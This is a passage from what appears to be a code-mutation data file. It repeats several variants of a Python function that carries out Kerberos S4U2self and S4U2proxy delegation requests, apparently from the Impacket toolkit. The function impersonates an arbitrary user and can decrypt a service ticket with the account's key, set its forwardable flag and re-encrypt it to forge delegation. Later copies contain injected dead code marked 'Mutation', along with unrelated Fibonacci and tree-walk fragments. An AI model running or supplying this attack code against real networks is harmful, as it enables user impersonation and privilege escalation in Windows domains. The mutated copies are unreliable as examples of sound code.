print(tgsReq.prettyPrint())\n    logging.info('\\tRequesting S4U2self')\n    message = encoder.encode(tgsReq)\n    r = sendReceive(message, self.__domain, kdcHost)\n    tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('TGS_REP')\n        print(tgs.prettyPrint())\n    if self.__force_forwardable:\n        if isinstance(nthash, str):\n            try:\n                nthash = unhexlify(nthash)\n            except TypeError:\n                pass\n        if isinstance(aesKey, str):\n            try:\n                aesKey = unhexlify(aesKey)\n            except TypeError:\n                pass\n        if self.__password != '' and self.__domain != '' and (self.__user != ''):\n            if not nthash:\n                nthash = compute_nthash(self.__password)\n                if logging.getLogger().level == logging.DEBUG:\n                    logging.debug('NTHash')\n                    print(hexlify(nthash).decode())\n            if not aesKey:\n                salt = self.__domain.upper() + self.__user\n                aesKey = _AES256CTS.string_to_key(self.__password, salt, params=None).contents\n                if logging.getLogger().level == logging.DEBUG:\n                    logging.debug('AESKey')\n                    print(hexlify(aesKey).decode())\n        cipherText = tgs['ticket']['enc-part']['cipher']\n        newCipher = _enctype_table[int(tgs['ticket']['enc-part']['etype'])]\n        if newCipher.enctype == Enctype.RC4:\n            key = Key(newCipher.enctype, nthash)\n        else:\n            key = Key(newCipher.enctype, aesKey)\n        plainText = newCipher.decrypt(key, 2, cipherText)\n        encTicketPart = decoder.decode(plainText, asn1Spec=EncTicketPart())[0]\n        logging.debug('\\tService ticket from S4U2self flags: ' + str(encTicketPart['flags']))\n        logging.debug('\\tService ticket from S4U2self is' + ('' if encTicketPart['flags'][TicketFlags.forwardable.value] == 1 else ' not') + ' forwardable')\n        logging.info('\\tForcing the service ticket to be forwardable')\n        flagBits = encTicketPart['flags'].asBinary()\n        flagBits = flagBits[:TicketFlags.forwardable.value] + '1' + flagBits[TicketFlags.forwardable.value + 1:]\n        encTicketPart['flags'] = encTicketPart['flags'].clone(value=flagBits)\n        logging.debug('\\tService ticket flags after modification: ' + str(encTicketPart['flags']))\n        logging.debug('\\tService ticket now is' + ('' if encTicketPart['flags'][TicketFlags.forwardable.value] == 1 else ' not') + ' forwardable')\n        encodedEncTicketPart = encoder.encode(encTicketPart)\n        cipherText = newCipher.encrypt(key, 2, encodedEncTicketPart, None)\n        tgs['ticket']['enc-part']['cipher'] = cipherText\n    ticketTGT = Ticket()\n    ticketTGT.from_asn1(decodedTGT['ticket'])\n    ticket = Ticket()\n    ticket.from_asn1(tgs['ticket'])\n    apReq = AP_REQ()\n    apReq['pvno'] = 5\n    apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)\n    opts = list()\n    apReq['ap-options'] = constants.encodeFlags(opts)\n    seq_set(apReq, 'ticket', ticketTGT.to_asn1)\n    authenticator = Authenticator()\n    authenticator['authenticator-vno'] = 5\n    authenticator['crealm'] = str(decodedTGT['crealm'])\n    clientName = Principal()\n    clientName.from_asn1(decodedTGT, 'crealm', 'cname')\n    seq_set(authenticator, 'cname', clientName.components_to_asn1)\n    now = datetime.datetime.utcnow()\n    authenticator['cusec'] = now.microsecond\n    authenticator['ctime'] = KerberosTime.to_asn1(now)\n    encodedAuthenticator = encoder.encode(authenticator)\n    encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)\n    apReq['authenticator'] = noValue\n    apReq['authenticator']['etype'] = cipher.enctype\n    apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator\n    encodedApReq = encoder.encode(apReq)\n    tgsReq = TGS_REQ()\n    tgsReq['pvno'] = 5\n    tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)\n    tgsReq['padata'] = noValue\n    tgsReq['padata'][0] = noValue\n    tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)\n    tgsReq['padata'][0]['padata-value'] = encodedApReq\n    paPacOptions = PA_PAC_OPTIONS()\n    paPacOptions['flags'] = constants.encodeFlags((constants.PAPacOptions.resource_based_constrained_delegation.value,))\n    tgsReq['padata'][1] = noValue\n    tgsReq['padata'][1]['padata-type'] = constants.PreAuthenticationDataTypes.PA_PAC_OPTIONS.value\n    tgsReq['padata'][1]['padata-value'] = encoder.encode(paPacOptions)\n    reqBody = seq_set(tgsReq, 'req-body')\n    opts = list()\n    opts.append(constants.KDCOptions.cname_in_addl_tkt.value)\n    opts.append(constants.KDCOptions.canonicalize.value)\n    opts.append(constants.KDCOptions.forwardable.value)\n    opts.append(constants.KDCOptions.renewable.value)\n    reqBody['kdc-options'] = constants.encodeFlags(opts)\n    service2 = Principal(self.__options.spn, type=constants.PrincipalNameType.NT_SRV_INST.value)\n    seq_set(reqBody, 'sname', service2.components_to_asn1)\n    reqBody['realm'] = self.__domain\n    myTicket = ticket.to_asn1(TicketAsn1())\n    seq_set_iter(reqBody, 'additional-tickets', (myTicket,))\n    now = datetime.datetime.utcnow() + datetime.timedelta(days=1)\n    reqBody['till'] = KerberosTime.to_asn1(now)\n    reqBody['nonce'] = random.getrandbits(31)\n    seq_set_iter(reqBody, 'etype', (int(constants.EncryptionTypes.rc4_hmac.value), int(constants.EncryptionTypes.des3_cbc_sha1_kd.value), int(constants.EncryptionTypes.des_cbc_md5.value), int(cipher.enctype)))\n    message = encoder.encode(tgsReq)\n    logging.info('\\tRequesting S4U2Proxy')\n    r = sendReceive(message, self.__domain, kdcHost)\n    tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]\n    cipherText = tgs['enc-part']['cipher']\n    plainText = cipher.decrypt(sessionKey, 8, cipherText)\n    encTGSRepPart = decoder.decode(plainText, asn1Spec=EncTGSRepPart())[0]\n    newSessionKey = Key(encTGSRepPart['key']['keytype'], encTGSRepPart['key']['keyvalue'])\n    cipher = _enctype_table[encTGSRepPart['key']['keytype']]\n    return (r, cipher, sessionKey, newSessionKey)",
            "def doS4U(self, tgt, cipher, oldSessionKey, sessionKey, nthash, aesKey, kdcHost):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]\n    ticket = Ticket()\n    ticket.from_asn1(decodedTGT['ticket'])\n    apReq = AP_REQ()\n    apReq['pvno'] = 5\n    apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)\n    opts = list()\n    apReq['ap-options'] = constants.encodeFlags(opts)\n    seq_set(apReq, 'ticket', ticket.to_asn1)\n    authenticator = Authenticator()\n    authenticator['authenticator-vno'] = 5\n    authenticator['crealm'] = str(decodedTGT['crealm'])\n    clientName = Principal()\n    clientName.from_asn1(decodedTGT, 'crealm', 'cname')\n    seq_set(authenticator, 'cname', clientName.components_to_asn1)\n    now = datetime.datetime.utcnow()\n    authenticator['cusec'] = now.microsecond\n    authenticator['ctime'] = KerberosTime.to_asn1(now)\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('AUTHENTICATOR')\n        print(authenticator.prettyPrint())\n        print('\\n')\n    encodedAuthenticator = encoder.encode(authenticator)\n    encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)\n    apReq['authenticator'] = noValue\n    apReq['authenticator']['etype'] = cipher.enctype\n    apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator\n    encodedApReq = encoder.encode(apReq)\n    tgsReq = TGS_REQ()\n    tgsReq['pvno'] = 5\n    tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)\n    tgsReq['padata'] = noValue\n    tgsReq['padata'][0] = noValue\n    tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)\n    tgsReq['padata'][0]['padata-value'] = encodedApReq\n    clientName = Principal(self.__options.impersonate, type=constants.PrincipalNameType.NT_PRINCIPAL.value)\n    S4UByteArray = struct.pack('<I', constants.PrincipalNameType.NT_PRINCIPAL.value)\n    S4UByteArray += b(self.__options.impersonate) + b(self.__domain) + b'Kerberos'\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('S4UByteArray')\n        hexdump(S4UByteArray)\n    checkSum = _HMACMD5.checksum(sessionKey, 17, S4UByteArray)\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('CheckSum')\n        hexdump(checkSum)\n    paForUserEnc = PA_FOR_USER_ENC()\n    seq_set(paForUserEnc, 'userName', clientName.components_to_asn1)\n    paForUserEnc['userRealm'] = self.__domain\n    paForUserEnc['cksum'] = noValue\n    paForUserEnc['cksum']['cksumtype'] = int(constants.ChecksumTypes.hmac_md5.value)\n    paForUserEnc['cksum']['checksum'] = checkSum\n    paForUserEnc['auth-package'] = 'Kerberos'\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('PA_FOR_USER_ENC')\n        print(paForUserEnc.prettyPrint())\n    encodedPaForUserEnc = encoder.encode(paForUserEnc)\n    tgsReq['padata'][1] = noValue\n    tgsReq['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_FOR_USER.value)\n    tgsReq['padata'][1]['padata-value'] = encodedPaForUserEnc\n    reqBody = seq_set(tgsReq, 'req-body')\n    opts = list()\n    opts.append(constants.KDCOptions.forwardable.value)\n    opts.append(constants.KDCOptions.renewable.value)\n    opts.append(constants.KDCOptions.canonicalize.value)\n    reqBody['kdc-options'] = constants.encodeFlags(opts)\n    serverName = Principal(self.__user, type=constants.PrincipalNameType.NT_UNKNOWN.value)\n    seq_set(reqBody, 'sname', serverName.components_to_asn1)\n    reqBody['realm'] = str(decodedTGT['crealm'])\n    now = datetime.datetime.utcnow() + datetime.timedelta(days=1)\n    reqBody['till'] = KerberosTime.to_asn1(now)\n    reqBody['nonce'] = random.getrandbits(31)\n    seq_set_iter(reqBody, 'etype', (int(cipher.enctype), int(constants.EncryptionTypes.rc4_hmac.value)))\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('Final TGS')\n        print(tgsReq.prettyPrint())\n    logging.info('\\tRequesting S4U2self')\n    message = encoder.encode(tgsReq)\n    r = sendReceive(message, self.__domain, kdcHost)\n    tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('TGS_REP')\n        print(tgs.prettyPrint())\n    if self.__force_forwardable:\n        if isinstance(nthash, str):\n            try:\n                nthash = unhexlify(nthash)\n            except TypeError:\n                pass\n        if isinstance(aesKey, str):\n            try:\n                aesKey = unhexlify(aesKey)\n            except TypeError:\n                pass\n        if self.__password != '' and self.__domain != '' and (self.__user != ''):\n            if not nthash:\n                nthash = compute_nthash(self.__password)\n                if logging.getLogger().level == logging.DEBUG:\n                    logging.debug('NTHash')\n                    print(hexlify(nthash).decode())\n            if not aesKey:\n                salt = self.__domain.upper() + self.__user\n                aesKey = _AES256CTS.string_to_key(self.__password, salt, params=None).contents\n                if logging.getLogger().level == logging.DEBUG:\n                    logging.debug('AESKey')\n                    print(hexlify(aesKey).decode())\n        cipherText = tgs['ticket']['enc-part']['cipher']\n        newCipher = _enctype_table[int(tgs['ticket']['enc-part']['etype'])]\n        if newCipher.enctype == Enctype.RC4:\n            key = Key(newCipher.enctype, nthash)\n        else:\n            key = Key(newCipher.enctype, aesKey)\n        plainText = newCipher.decrypt(key, 2, cipherText)\n        encTicketPart = decoder.decode(plainText, asn1Spec=EncTicketPart())[0]\n        logging.debug('\\tService ticket from S4U2self flags: ' + str(encTicketPart['flags']))\n        logging.debug('\\tService ticket from S4U2self is' + ('' if encTicketPart['flags'][TicketFlags.forwardable.value] == 1 else ' not') + ' forwardable')\n        logging.info('\\tForcing the service ticket to be forwardable')\n        flagBits = encTicketPart['flags'].asBinary()\n        flagBits = flagBits[:TicketFlags.forwardable.value] + '1' + flagBits[TicketFlags.forwardable.value + 1:]\n        encTicketPart['flags'] = encTicketPart['flags'].clone(value=flagBits)\n        logging.debug('\\tService ticket flags after modification: ' + str(encTicketPart['flags']))\n        logging.debug('\\tService ticket now is' + ('' if encTicketPart['flags'][TicketFlags.forwardable.value] == 1 else ' not') + ' forwardable')\n        encodedEncTicketPart = encoder.encode(encTicketPart)\n        cipherText = newCipher.encrypt(key, 2, encodedEncTicketPart, None)\n        tgs['ticket']['enc-part']['cipher'] = cipherText\n    ticketTGT = Ticket()\n    ticketTGT.from_asn1(decodedTGT['ticket'])\n    ticket = Ticket()\n    ticket.from_asn1(tgs['ticket'])\n    apReq = AP_REQ()\n    apReq['pvno'] = 5\n    apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)\n    opts = list()\n    apReq['ap-options'] = constants.encodeFlags(opts)\n    seq_set(apReq, 'ticket', ticketTGT.to_asn1)\n    authenticator = Authenticator()\n    authenticator['authenticator-vno'] = 5\n    authenticator['crealm'] = str(decodedTGT['crealm'])\n    clientName = Principal()\n    clientName.from_asn1(decodedTGT, 'crealm', 'cname')\n    seq_set(authenticator, 'cname', clientName.components_to_asn1)\n    now = datetime.datetime.utcnow()\n    authenticator['cusec'] = now.microsecond\n    authenticator['ctime'] = KerberosTime.to_asn1(now)\n    encodedAuthenticator = encoder.encode(authenticator)\n    encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)\n    apReq['authenticator'] = noValue\n    apReq['authenticator']['etype'] = cipher.enctype\n    apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator\n    encodedApReq = encoder.encode(apReq)\n    tgsReq = TGS_REQ()\n    tgsReq['pvno'] = 5\n    tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)\n    tgsReq['padata'] = noValue\n    tgsReq['padata'][0] = noValue\n    tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)\n    tgsReq['padata'][0]['padata-value'] = encodedApReq\n    paPacOptions = PA_PAC_OPTIONS()\n    paPacOptions['flags'] = constants.encodeFlags((constants.PAPacOptions.resource_based_constrained_delegation.value,))\n    tgsReq['padata'][1] = noValue\n    tgsReq['padata'][1]['padata-type'] = constants.PreAuthenticationDataTypes.PA_PAC_OPTIONS.value\n    tgsReq['padata'][1]['padata-value'] = encoder.encode(paPacOptions)\n    reqBody = seq_set(tgsReq, 'req-body')\n    opts = list()\n    opts.append(constants.KDCOptions.cname_in_addl_tkt.value)\n    opts.append(constants.KDCOptions.canonicalize.value)\n    opts.append(constants.KDCOptions.forwardable.value)\n    opts.append(constants.KDCOptions.renewable.value)\n    reqBody['kdc-options'] = constants.encodeFlags(opts)\n    service2 = Principal(self.__options.spn, type=constants.PrincipalNameType.NT_SRV_INST.value)\n    seq_set(reqBody, 'sname', service2.components_to_asn1)\n    reqBody['realm'] = self.__domain\n    myTicket = ticket.to_asn1(TicketAsn1())\n    seq_set_iter(reqBody, 'additional-tickets', (myTicket,))\n    now = datetime.datetime.utcnow() + datetime.timedelta(days=1)\n    reqBody['till'] = KerberosTime.to_asn1(now)\n    reqBody['nonce'] = random.getrandbits(31)\n    seq_set_iter(reqBody, 'etype', (int(constants.EncryptionTypes.rc4_hmac.value), int(constants.EncryptionTypes.des3_cbc_sha1_kd.value), int(constants.EncryptionTypes.des_cbc_md5.value), int(cipher.enctype)))\n    message = encoder.encode(tgsReq)\n    logging.info('\\tRequesting S4U2Proxy')\n    r = sendReceive(message, self.__domain, kdcHost)\n    tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]\n    cipherText = tgs['enc-part']['cipher']\n    plainText = cipher.decrypt(sessionKey, 8, cipherText)\n    encTGSRepPart = decoder.decode(plainText, asn1Spec=EncTGSRepPart())[0]\n    newSessionKey = Key(encTGSRepPart['key']['keytype'], encTGSRepPart['key']['keyvalue'])\n    cipher = _enctype_table[encTGSRepPart['key']['keytype']]\n    return (r, cipher, sessionKey, newSessionKey)",
            "def doS4U(self, tgt, cipher, oldSessionKey, sessionKey, nthash, aesKey, kdcHost):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]\n    ticket = Ticket()\n    ticket.from_asn1(decodedTGT['ticket'])\n    apReq = AP_REQ()\n    apReq['pvno'] = 5\n    apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)\n    opts = list()\n    apReq['ap-options'] = constants.encodeFlags(opts)\n    seq_set(apReq, 'ticket', ticket.to_asn1)\n    authenticator = Authenticator()\n    authenticator['authenticator-vno'] = 5\n    authenticator['crealm'] = str(decodedTGT['crealm'])\n    clientName = Principal()\n    clientName.from_asn1(decodedTGT, 'crealm', 'cname')\n    seq_set(authenticator, 'cname', clientName.components_to_asn1)\n    now = datetime.datetime.utcnow()\n    authenticator['cusec'] = now.microsecond\n    authenticator['ctime'] = KerberosTime.to_asn1(now)\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('AUTHENTICATOR')\n        print(authenticator.prettyPrint())\n        print('\\n')\n    encodedAuthenticator = encoder.encode(authenticator)\n    encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)\n    apReq['authenticator'] = noValue\n    apReq['authenticator']['etype'] = cipher.enctype\n    apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator\n    encodedApReq = encoder.encode(apReq)\n    tgsReq = TGS_REQ()\n    tgsReq['pvno'] = 5\n    tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)\n    tgsReq['padata'] = noValue\n    tgsReq['padata'][0] = noValue\n    tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)\n    tgsReq['padata'][0]['padata-value'] = encodedApReq\n    clientName = Principal(self.__options.impersonate, type=constants.PrincipalNameType.NT_PRINCIPAL.value)\n    S4UByteArray = struct.pack('<I', constants.PrincipalNameType.NT_PRINCIPAL.value)\n    S4UByteArray += b(self.__options.impersonate) + b(self.__domain) + b'Kerberos'\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('S4UByteArray')\n        hexdump(S4UByteArray)\n    checkSum = _HMACMD5.checksum(sessionKey, 17, S4UByteArray)\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('CheckSum')\n        hexdump(checkSum)\n    paForUserEnc = PA_FOR_USER_ENC()\n    seq_set(paForUserEnc, 'userName', clientName.components_to_asn1)\n    paForUserEnc['userRealm'] = self.__domain\n    paForUserEnc['cksum'] = noValue\n    paForUserEnc['cksum']['cksumtype'] = int(constants.ChecksumTypes.hmac_md5.value)\n    paForUserEnc['cksum']['checksum'] = checkSum\n    paForUserEnc['auth-package'] = 'Kerberos'\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('PA_FOR_USER_ENC')\n        print(paForUserEnc.prettyPrint())\n    encodedPaForUserEnc = encoder.encode(paForUserEnc)\n    tgsReq['padata'][1] = noValue\n    tgsReq['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_FOR_USER.value)\n    tgsReq['padata'][1]['padata-value'] = encodedPaForUserEnc\n    reqBody = seq_set(tgsReq, 'req-body')\n    opts = list()\n    opts.append(constants.KDCOptions.forwardable.value)\n    opts.append(constants.KDCOptions.renewable.value)\n    opts.append(constants.KDCOptions.canonicalize.value)\n    reqBody['kdc-options'] = constants.encodeFlags(opts)\n    serverName = Principal(self.__user, type=constants.PrincipalNameType.NT_UNKNOWN.value)\n    seq_set(reqBody, 'sname', serverName.components_to_asn1)\n    reqBody['realm'] = str(decodedTGT['crealm'])\n    now = datetime.datetime.utcnow() + datetime.timedelta(days=1)\n    reqBody['till'] = KerberosTime.to_asn1(now)\n    reqBody['nonce'] = random.getrandbits(31)\n    seq_set_iter(reqBody, 'etype', (int(cipher.enctype), int(constants.EncryptionTypes.rc4_hmac.value)))\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('Final TGS')\n        print(tgsReq.prettyPrint())\n    logging.info('\\tRequesting S4U2self')\n    message = encoder.encode(tgsReq)\n    r = sendReceive(message, self.__domain, kdcHost)\n    tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('TGS_REP')\n        print(tgs.prettyPrint())\n    if self.__force_forwardable:\n        if isinstance(nthash, str):\n            try:\n                nthash = unhexlify(nthash)\n            except TypeError:\n                pass\n        if isinstance(aesKey, str):\n            try:\n                aesKey = unhexlify(aesKey)\n            except TypeError:\n                pass\n        if self.__password != '' and self.__domain != '' and (self.__user != ''):\n            if not nthash:\n                nthash = compute_nthash(self.__password)\n                if logging.getLogger().level == logging.DEBUG:\n                    logging.debug('NTHash')\n                    print(hexlify(nthash).decode())\n            if not aesKey:\n                salt = self.__domain.upper() + self.__user\n                aesKey = _AES256CTS.string_to_key(self.__password, salt, params=None).contents\n                if logging.getLogger().level == logging.DEBUG:\n                    logging.debug('AESKey')\n                    print(hexlify(aesKey).decode())\n        cipherText = tgs['ticket']['enc-part']['cipher']\n        newCipher = _enctype_table[int(tgs['ticket']['enc-part']['etype'])]\n        if newCipher.enctype == Enctype.RC4:\n            key = Key(newCipher.enctype, nthash)\n        else:\n            key = Key(newCipher.enctype, aesKey)\n        plainText = newCipher.decrypt(key, 2, cipherText)\n        encTicketPart = decoder.decode(plainText, asn1Spec=EncTicketPart())[0]\n        logging.debug('\\tService ticket from S4U2self flags: ' + str(encTicketPart['flags']))\n        logging.debug('\\tService ticket from S4U2self is' + ('' if encTicketPart['flags'][TicketFlags.forwardable.value] == 1 else ' not') + ' forwardable')\n        logging.info('\\tForcing the service ticket to be forwardable')\n        flagBits = encTicketPart['flags'].asBinary()\n        flagBits = flagBits[:TicketFlags.forwardable.value] + '1' + flagBits[TicketFlags.forwardable.value + 1:]\n        encTicketPart['flags'] = encTicketPart['flags'].clone(value=flagBits)\n        logging.debug('\\tService ticket flags after modification: ' + str(encTicketPart['flags']))\n        logging.debug('\\tService ticket now is' + ('' if encTicketPart['flags'][TicketFlags.forwardable.value] == 1 else ' not') + ' forwardable')\n        encodedEncTicketPart = encoder.encode(encTicketPart)\n        cipherText = newCipher.encrypt(key, 2, encodedEncTicketPart, None)\n        tgs['ticket']['enc-part']['cipher'] = cipherText\n    ticketTGT = Ticket()\n    ticketTGT.from_asn1(decodedTGT['ticket'])\n    ticket = Ticket()\n    ticket.from_asn1(tgs['ticket'])\n    apReq = AP_REQ()\n    apReq['pvno'] = 5\n    apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)\n    opts = list()\n    apReq['ap-options'] = constants.encodeFlags(opts)\n    seq_set(apReq, 'ticket', ticketTGT.to_asn1)\n    authenticator = Authenticator()\n    authenticator['authenticator-vno'] = 5\n    authenticator['crealm'] = str(decodedTGT['crealm'])\n    clientName = Principal()\n    clientName.from_asn1(decodedTGT, 'crealm', 'cname')\n    seq_set(authenticator, 'cname', clientName.components_to_asn1)\n    now = datetime.datetime.utcnow()\n    authenticator['cusec'] = now.microsecond\n    authenticator['ctime'] = KerberosTime.to_asn1(now)\n    encodedAuthenticator = encoder.encode(authenticator)\n    encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)\n    apReq['authenticator'] = noValue\n    apReq['authenticator']['etype'] = cipher.enctype\n    apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator\n    encodedApReq = encoder.encode(apReq)\n    tgsReq = TGS_REQ()\n    tgsReq['pvno'] = 5\n    tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)\n    tgsReq['padata'] = noValue\n    tgsReq['padata'][0] = noValue\n    tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)\n    tgsReq['padata'][0]['padata-value'] = encodedApReq\n    paPacOptions = PA_PAC_OPTIONS()\n    paPacOptions['flags'] = constants.encodeFlags((constants.PAPacOptions.resource_based_constrained_delegation.value,))\n    tgsReq['padata'][1] = noValue\n    tgsReq['padata'][1]['padata-type'] = constants.PreAuthenticationDataTypes.PA_PAC_OPTIONS.value\n    tgsReq['padata'][1]['padata-value'] = encoder.encode(paPacOptions)\n    reqBody = seq_set(tgsReq, 'req-body')\n    opts = list()\n    opts.append(constants.KDCOptions.cname_in_addl_tkt.value)\n    opts.append(constants.KDCOptions.canonicalize.value)\n    opts.append(constants.KDCOptions.forwardable.value)\n    opts.append(constants.KDCOptions.renewable.value)\n    reqBody['kdc-options'] = constants.encodeFlags(opts)\n    service2 = Principal(self.__options.spn, type=constants.PrincipalNameType.NT_SRV_INST.value)\n    seq_set(reqBody, 'sname', service2.components_to_asn1)\n    reqBody['realm'] = self.__domain\n    myTicket = ticket.to_asn1(TicketAsn1())\n    seq_set_iter(reqBody, 'additional-tickets', (myTicket,))\n    now = datetime.datetime.utcnow() + datetime.timedelta(days=1)\n    reqBody['till'] = KerberosTime.to_asn1(now)\n    reqBody['nonce'] = random.getrandbits(31)\n    seq_set_iter(reqBody, 'etype', (int(constants.EncryptionTypes.rc4_hmac.value), int(constants.EncryptionTypes.des3_cbc_sha1_kd.value), int(constants.EncryptionTypes.des_cbc_md5.value), int(cipher.enctype)))\n    message = encoder.encode(tgsReq)\n    logging.info('\\tRequesting S4U2Proxy')\n    r = sendReceive(message, self.__domain, kdcHost)\n    tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]\n    cipherText = tgs['enc-part']['cipher']\n    plainText = cipher.decrypt(sessionKey, 8, cipherText)\n    encTGSRepPart = decoder.decode(plainText, asn1Spec=EncTGSRepPart())[0]\n    newSessionKey = Key(encTGSRepPart['key']['keytype'], encTGSRepPart['key']['keyvalue'])\n    cipher = _enctype_table[encTGSRepPart['key']['keytype']]\n    return (r, cipher, sessionKey, newSessionKey)",
            "def doS4U(self, tgt, cipher, oldSessionKey, sessionKey, nthash, aesKey, kdcHost):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]\n    ticket = Ticket()\n    ticket.from_asn1(decodedTGT['ticket'])\n    apReq = AP_REQ()\n    apReq['pvno'] = 5\n    apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)\n    opts = list()\n    apReq['ap-options'] = constants.encodeFlags(opts)\n    seq_set(apReq, 'ticket', ticket.to_asn1)\n    authenticator = Authenticator()\n    authenticator['authenticator-vno'] = 5\n    authenticator['crealm'] = str(decodedTGT['crealm'])\n    clientName = Principal()\n    clientName.from_asn1(decodedTGT, 'crealm', 'cname')\n    seq_set(authenticator, 'cname', clientName.components_to_asn1)\n    now = datetime.datetime.utcnow()\n    authenticator['cusec'] = now.microsecond\n    authenticator['ctime'] = KerberosTime.to_asn1(now)\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('AUTHENTICATOR')\n        print(authenticator.prettyPrint())\n        print('\\n')\n    encodedAuthenticator = encoder.encode(authenticator)\n    encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)\n    apReq['authenticator'] = noValue\n    apReq['authenticator']['etype'] = cipher.enctype\n    apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator\n    encodedApReq = encoder.encode(apReq)\n    tgsReq = TGS_REQ()\n    tgsReq['pvno'] = 5\n    tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)\n    tgsReq['padata'] = noValue\n    tgsReq['padata'][0] = noValue\n    tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)\n    tgsReq['padata'][0]['padata-value'] = encodedApReq\n    clientName = Principal(self.__options.impersonate, type=constants.PrincipalNameType.NT_PRINCIPAL.value)\n    S4UByteArray = struct.pack('<I', constants.PrincipalNameType.NT_PRINCIPAL.value)\n    S4UByteArray += b(self.__options.impersonate) + b(self.__domain) + b'Kerberos'\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('S4UByteArray')\n        hexdump(S4UByteArray)\n    checkSum = _HMACMD5.checksum(sessionKey, 17, S4UByteArray)\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('CheckSum')\n        hexdump(checkSum)\n    paForUserEnc = PA_FOR_USER_ENC()\n    seq_set(paForUserEnc, 'userName', clientName.components_to_asn1)\n    paForUserEnc['userRealm'] = self.__domain\n    paForUserEnc['cksum'] = noValue\n    paForUserEnc['cksum']['cksumtype'] = int(constants.ChecksumTypes.hmac_md5.value)\n    paForUserEnc['cksum']['checksum'] = checkSum\n    paForUserEnc['auth-package'] = 'Kerberos'\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('PA_FOR_USER_ENC')\n        print(paForUserEnc.prettyPrint())\n    encodedPaForUserEnc = encoder.encode(paForUserEnc)\n    tgsReq['padata'][1] = noValue\n    tgsReq['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_FOR_USER.value)\n    tgsReq['padata'][1]['padata-value'] = encodedPaForUserEnc\n    reqBody = seq_set(tgsReq, 'req-body')\n    opts = list()\n    opts.append(constants.KDCOptions.forwardable.value)\n    opts.append(constants.KDCOptions.renewable.value)\n    opts.append(constants.KDCOptions.canonicalize.value)\n    reqBody['kdc-options'] = constants.encodeFlags(opts)\n    serverName = Principal(self.__user, type=constants.PrincipalNameType.NT_UNKNOWN.value)\n    seq_set(reqBody, 'sname', serverName.components_to_asn1)\n    reqBody['realm'] = str(decodedTGT['crealm'])\n    now = datetime.datetime.utcnow() + datetime.timedelta(days=1)\n    reqBody['till'] = KerberosTime.to_asn1(now)\n    reqBody['nonce'] 